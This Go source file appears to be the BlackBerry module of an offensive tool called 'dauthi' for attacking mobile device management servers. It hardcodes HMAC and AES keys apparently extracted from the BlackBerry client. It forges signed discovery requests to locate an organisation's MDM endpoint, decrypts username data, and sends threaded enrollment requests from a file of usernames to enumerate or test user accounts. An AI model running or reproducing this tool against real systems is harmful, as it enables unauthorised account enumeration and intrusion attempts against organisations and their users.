package blackberry

import (
	"bytes"
	"fmt"
	URL "net/url"
	"strings"
	"time"

	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"

	"dauthi/utils"
)

type mdma struct {
	opts utils.ChargeOpts
	logr *utils.Logger
	cycle
}

type cycle struct {
	buff   *chan bool
	block  *chan bool
	length int
	api    *utils.API
}

const (
	Usage = `
  BlackBerry Options:
    -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]

    -pub                   SPEKE secp521r1 public certificate
    -pri                   SPEKE secp521r1 private key
    -email                 User Email address
  `

	// Methods are available tool methods
	Methods = `
  BlackBerry Methods:
    disco                  BlackBerry endpoint discovery query
    decrypt                Decrypt BlackBerry username details
    prof                   Profile the BlackBerry provisioning details
    auth-user              BlackBerry user based authentication
	`
	// HMACSHA512 static salt
	hmacsalt = "\xA4\x6B\xF8\x4C\xD3\x0B\xD0\x99\x49\xCA\x01\x12\xB0\x01\x4B\xE3"
	// HMACSHA512 static key
	hmackey = "\x3D\xAD\xA2\xC2\xCB\x99\x92\xF7\xE3\xFB\xE5\x13\x9E\x8B\x40\xD4\x34" +
		"\x87\x76\x90\xA2\x22\x28\xE2\xFA\x93\xA8\x04\x04\xB4\x80\x3C\xB2\x68\xB6\x04" +
		"\xEE\x75\x0B\xBC\x4C\x4F\x42\x71\x6F\xB9\xEF\x47\x04\x5C\xC5\x6D\xB8\xAF\xB5" +
		"\x6B\x99\xAB\x1F\xEF\xA5\xCD\x58\xA4"

	// aes256cbc static key
	aes256key = "\x32\xf4\x92\x98\x09\x9d\xba\xe9\x70\xd6\x6c\xaa\x29\x6a\xa2\xef\xf9" +
		"\x4e\xaf\x67\xb1\x5d\x37\xe1\x32\x84\x81\x2e\xbf\x86\x1d\xb2"

	// aes256cbc static IV
	aes256IV = "\xca\x42\x20\x38\x1a\x39\xd9\x48\xf1\x86\xd4\x03\x76\x34\x3f\x70"

	discoveryAPI = `https://discoveryservice.blackberry.com/discoveryPoxmlServlet/discoveryMdmInput`
	profileAPI   = `https://%s%s/mdm`
	enrollAPI    = `https://%s%s/mdm/enrol/%s`

	postDiscovery = `<requestInfoType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ` +
		`xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns="urn:schemas:rim:discovery:otarequest:mdm">` +
		`<clientVersion>12.40.1.157442</clientVersion><deviceId>unknown</deviceId><deviceModel>Pixel 2 XL` +
		`</deviceModel><deviceType>taimen</deviceType><manufacturer>Google</manufacturer><osFamily>android` +
		`</osFamily><osVersion>11</osVersion><userId>%s</userId></requestInfoType>`
	postEnrol = `<?xml version="1.0"?><enrollment version="3.0"><transaction-id>%s</transaction-id>` +
		`<speke-request><user-id>0;1;%s</user-id><client-public-key>%s</client-public-key></speke-request></enrollment>`
)

func b64encode(v []byte) string {
	return base64.StdEncoding.EncodeToString(v)
}

func b64decode(v string) []byte {
	data, _ := base64.StdEncoding.DecodeString(v)
	return data
}

func sha512hmac(time string) string {
	mac := hmac.New(sha512.New, []byte(hmackey))
	msg := fmt.Sprintf("unknowntaimen%s%s", time, hmacsalt)
	mac.Write([]byte(msg))
	return b64encode(mac.Sum(nil))
}

func pkcs5Padding(ciphertext []byte, blockSize int, after int) []byte {
	padding := (blockSize - len(ciphertext)%blockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func aes256encrypt(v string) string {
	bPlaintext := pkcs5Padding([]byte(v), aes.BlockSize, len(v))
	block, _ := aes.NewCipher([]byte(aes256key))
	ciphertext := make([]byte, len(bPlaintext))
	mode := cipher.NewCBCEncrypter(block, []byte(aes256IV))
	mode.CryptBlocks(ciphertext, bPlaintext)

	result := fmt.Sprintf("%s%s", aes256IV, ciphertext)
	return b64encode([]byte(result))
}

func aes256decrypt(v string) []byte {
	decoded := b64decode(v)
	pre := decoded[0:16]
	data := decoded[16:]
	block, _ := aes.NewCipher([]byte(aes256key))
	mode := cipher.NewCBCDecrypter(block, []byte(aes256IV))
	mode.CryptBlocks(data, data)
	return append(pre, data...)
}

// Init mdma with default values and return obj
func Init(o utils.ChargeOpts) *mdma {
	if o.Agent == "" {
		o.Agent = "Agent/20.08.0.23/Android/11"
	}
	log := utils.NewLogger("blackberry")

	return &mdma{
		opts: o,
		logr: log,
		cycle: cycle{
			api: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

// clone() copies an *mdma for process threading
func (m *mdma) clone() *mdma {
	clone := Init(m.opts) // assign target
	clone.cycle.block = m.cycle.block
	clone.cycle.buff = m.cycle.buff

	return clone
}

// Wrapper to parse JSON/XML objects
func (m *mdma) parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.cycle.api.Resp.ParseJSON(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.cycle.api.Resp.ParseXML(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

func (m *mdma) disco() {
	tstamp := fmt.Sprintf("%v", time.Now().UnixMilli())

	m.cycle.api.Name = `discoveryAPI`
	m.cycle.api.URL = discoveryAPI
	m.cycle.api.Data = fmt.Sprintf(postDiscovery, m.opts.Email)
	m.cycle.api.Method = `POST`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"RequestVersion":  []string{"1.0"},
			"X-Timestamp":     []string{tstamp},
			"Content-Type":    []string{"application/xml"},
			"X-AuthToken":     []string{sha512hmac(tstamp)},
			"Accept":          []string{"application/xml"},
			"X-AuthType":      []string{"android"},
			"User-Agent":      []string{m.opts.Agent},
			"Accept-Encoding": []string{"gzip, deflate"}}}

	m.cycle.api.WebCall()
	if m.cycle.api.Resp.Status != 200 {
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
		return
	}

	m.validate()
}

func (m *mdma) prof() {
	parsedURL, _ := URL.Parse(m.opts.Endpoint)

	m.cycle.api.Name = `profileAPI`
	m.cycle.api.URL = fmt.Sprintf(profileAPI, parsedURL.Host, parsedURL.Path)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `OPTIONS`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.opts.Agent}}}

	m.cycle.api.WebCall()
	if m.cycle.api.Resp.Header == nil {
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Profile Failed")
		return
	}
	m.validate()
}

func (m *mdma) auth() {
	parsedURL, _ := URL.Parse(m.opts.Endpoint)
	var file []byte
	var err error

	if m.opts.File != "" {
		file, err = utils.ReadFile(m.opts.File)
		if err != nil {
			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.opts.Threads)
	buff := make(chan bool, len(lines))
	m.cycle.block = &block
	m.cycle.buff = &buff
	m.cycle.length = len(lines)

	m.logr.Infof([]interface{}{m.opts.Method}, "buffing %d values across %d buffs", m.cycle.length, m.opts.Threads)

	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.cycle.buff <- true
			continue
		}

		target := m.clone() // assign target

		switch m.opts.Method {
		case "auth-user":
			if line == "" {
				line = target.opts.UserName
			} else {
				target.opts.UserName = line
			}
			pubX, _ := hex.DecodeString(target.opts.PubCert)
			target.cycle.api.Name = `checkLogin`
			target.cycle.api.URL = fmt.Sprintf(enrollAPI, parsedURL.Host, parsedURL.Path, utils.RandGUID())
			target.cycle.api.Data = fmt.Sprintf(postEnrol, b64encode([]byte(utils.RandUUID(16))), aes256encrypt(target.opts.UserName), b64encode(pubX))
			target.cycle.api.Method = `PUT`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.opts.Agent},
					"Content-Type": []string{"text/plain"}}}
		}

		target.thread()
	}

	for i := 0; i < m.cycle.length; i++ {
		<-*m.cycle.buff
	}
	close(*m.cycle.block)
	close(*m.cycle.buff)
}

// thread represents the buffing process to loop multiple requests
func (m *mdma) thread() {
	*m.cycle.block <- true
	go func() {
		m.cycle.api.WebCall()
		if m.cycle.api.Resp.Status == 0 {
			if m.opts.Miss < m.opts.Retry {
				m.opts.Miss++
				m.logr.Infof([]interface{}{m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Retrying Request")
				<-*m.cycle.block
				m.thread()
				return
			}
			m.logr.Failf([]interface{}{m.opts.Endpoint, m.opts.UserName, m.opts.Password}, "Null Server Response")
		}
		m.validate()

		// Sleep interval through buff loop
		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)
		<-*m.cycle.block
		*m.cycle.buff <- true
	}()
}

func (m *mdma) validate() {
	switch m.opts.Method {
	case "disco":
		var check struct {
			ResponseCode   int               `xml:"responseCode"`
			ActivationInfo string            `xml:"config>activationInfo"`
			Version        string            `json:"versionInfo"`
			Endpoint       map[string]string `json:"endpointInfo"`
		}
		if m.parser(&check, "xml") {
			return
		}
		if check.ResponseCode == 601 {
			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed")
			return
		}

		m.cycle.api.Resp.Body = b64decode(check.ActivationInfo)
		if m.parser(&check, "json") {
			return
		}

		m.logr.Successf([]interface{}{m.opts.Endpoint, check.Endpoint["serverAddress"]}, "Endpoint Discovered")

	case "prof":
		m.logr.Successf(nil, "Temporary Profile: \n%s\n", m.cycle.api.Resp.Header)

	case "auth-user":
		var check struct {
			Code   string `xml:"code"`
			MSG    string `xml:"message"`
			TranID string `xml:"transaction-id"`
		}
		if m.parser(&check, "xml") {
			return
		}
		m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Successful")

	}
}

// Call represents the switch function for activating all class methods
func (m *mdma) Call() {
	switch m.opts.Method {
	case "disco":
		if m.opts.Email == "" {
			email := "dave@" + m.opts.Endpoint
			m.logr.Infof([]interface{}{m.opts.Method}, "Using sample email: %s", email)
			m.opts.Email = email
		}
		m.disco()

	case "prof":
		if m.opts.Endpoint == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Endpoint required")
			return
		}
		m.prof()

	case "auth-user":
		if (m.opts.UserName == "" && m.opts.File == "") || m.opts.PubCert == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "User/PubCert or File/PubCert required")
			return
		}
		m.auth()

	case "decrypt":
		if m.opts.Endpoint == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "CipherTXT required")
			return
		}
		data := aes256decrypt(m.opts.Endpoint)
		m.logr.Successf([]interface{}{m.opts.Method}, "%x%s", data[0:16], data[16:])

	default:
		m.logr.StdOut(Methods)
		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
	}
}
